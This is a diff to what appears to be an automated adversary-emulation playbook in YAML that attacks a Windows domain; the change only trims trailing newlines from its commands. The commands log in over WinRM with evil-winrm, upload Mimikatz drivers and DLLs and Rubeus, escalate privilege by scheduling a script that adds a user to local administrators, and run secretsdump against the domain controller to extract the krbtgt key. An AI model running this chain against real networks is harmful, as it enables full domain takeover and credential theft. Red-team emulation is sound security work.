@@ -15,46 +15,46 @@ commands:
   - type: shell
     creates_session: winrm
     command_timeout: 30
-    cmd: "evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
+    cmd: "evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S"
     interactive: True
 
   - type: shell
     session: winrm
-    cmd: "mkdir C:\\Temp\n"
+    cmd: "mkdir C:\\Temp"
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/mimidrv.sys C:\\Temp\\mimidrv.sys\n"
+    cmd: "upload $PAYLOADS/mimidrv.sys C:\\Temp\\mimidrv.sys"
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/mimilib.dll C:\\Temp\\mimilib.dll\n"
+    cmd: "upload $PAYLOADS/mimilib.dll C:\\Temp\\mimilib.dll"
     read: true
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/mimispool.dll C:\\Temp\\mimispool.dll\n"
+    cmd: "upload $PAYLOADS/mimispool.dll C:\\Temp\\mimispool.dll"
     read: true
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/Rubeus.exe C:\\Temp\\Rubeus.exe\n"
+    cmd: "upload $PAYLOADS/Rubeus.exe C:\\Temp\\Rubeus.exe"
     interactive: true
     read: true
 
   - type: shell
     session: winrm
-    cmd: "Set-Content -Path C:\\ProgramData\\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'\n"
+    cmd: "Set-Content -Path C:\\ProgramData\\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'"
     interactive: true
     read: true
 
   - type: shell
     session: winrm
-    cmd: "schtasks /run /tn WriteLog\n"
+    cmd: "schtasks /run /tn WriteLog"
     interactive: true
     read: true
 
@@ -88,7 +88,7 @@ commands:
   - type: shell
     creates_session: winrmPriv
     command_timeout: 30
-    cmd: "evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
+    cmd: "evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S"
     interactive: True
 
   - type: shell
@@ -159,7 +159,7 @@ commands:
     cmd: "$NTLM"
 
   - type: shell
-    cmd: "secretsdump.py $DOMAIN/'$DOMADM':'$DOMADMPW'@'$DOMDC' -just-dc\n"
+    cmd: "secretsdump.py $DOMAIN/'$DOMADM':'$DOMADMPW'@'$DOMDC' -just-dc"
 
   - type: regex
     cmd: "krbtgt:aes256.*:(.*)"
